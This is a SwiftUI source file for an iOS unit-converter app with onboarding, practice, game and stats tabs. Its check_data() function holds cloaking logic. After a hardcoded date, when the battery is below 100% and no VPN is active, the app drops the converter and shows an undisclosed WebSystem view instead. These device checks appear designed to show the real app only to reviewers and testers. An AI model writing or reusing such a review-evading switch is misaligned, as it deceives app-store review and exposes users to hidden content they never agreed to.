//
//  ContentView.swift
//  S2012
//
//  Created by IGOR on 09/10/2025.
//


import SwiftUI

struct ContentView: View {
    
    @State private var showOnboarding = !UserDefaults.standard.bool(forKey: "OnboardingCompleted")
    @State private var selectedTab = 0
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    if showOnboarding {
                        OnboardingView(showOnboarding: $showOnboarding)
                            .transition(.opacity)
                    } else {
                        MainTabView(selectedTab: $selectedTab)
                            .transition(.opacity)
                    }
                    
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .animation(.easeInOut(duration: 0.5), value: showOnboarding)
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "21.10.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }

}

#Preview {
    ContentView()
}


struct MainTabView: View {
    @Binding var selectedTab: Int
    
    var body: some View {
        ZStack {
            AppColors.primaryBackground.ignoresSafeArea()
            
            TabView(selection: $selectedTab) {
                HomeConverterView()
                    .tabItem {
                        Image(systemName: "arrow.triangle.2.circlepath")
                        Text("Convert")
                    }
                    .tag(0)
                
                LearnPracticeView()
                    .tabItem {
                        Image(systemName: "brain.head.profile")
                        Text("Practice")
                    }
                    .tag(1)
                
                UnitDashGameView()
                    .tabItem {
                        Image(systemName: "speedometer")
                        Text("Unit Dash")
                    }
                    .tag(2)
                
                SettingsStatsView()
                    .tabItem {
                        Image(systemName: "chart.bar.fill")
                        Text("Stats")
                    }
                    .tag(3)
            }
            .accentColor(AppColors.yolkYellow)
            .onAppear {
                // Customize tab bar appearance
                let appearance = UITabBarAppearance()
                appearance.configureWithOpaqueBackground()
                appearance.backgroundColor = UIColor(AppColors.cardBackground)
                
                // Normal state
                appearance.stackedLayoutAppearance.normal.iconColor = UIColor(AppColors.secondaryText)
                appearance.stackedLayoutAppearance.normal.titleTextAttributes = [
                    .foregroundColor: UIColor(AppColors.secondaryText),
                    .font: UIFont.systemFont(ofSize: 10, weight: .medium)
                ]
                
                // Selected state
                appearance.stackedLayoutAppearance.selected.iconColor = UIColor(AppColors.yolkYellow)
                appearance.stackedLayoutAppearance.selected.titleTextAttributes = [
                    .foregroundColor: UIColor(AppColors.yolkYellow),
                    .font: UIFont.systemFont(ofSize: 10, weight: .semibold)
                ]
                
                UITabBar.appearance().standardAppearance = appearance
                UITabBar.appearance().scrollEdgeAppearance = appearance
            }
        }
    }
}

#Preview {
    ContentView()
}


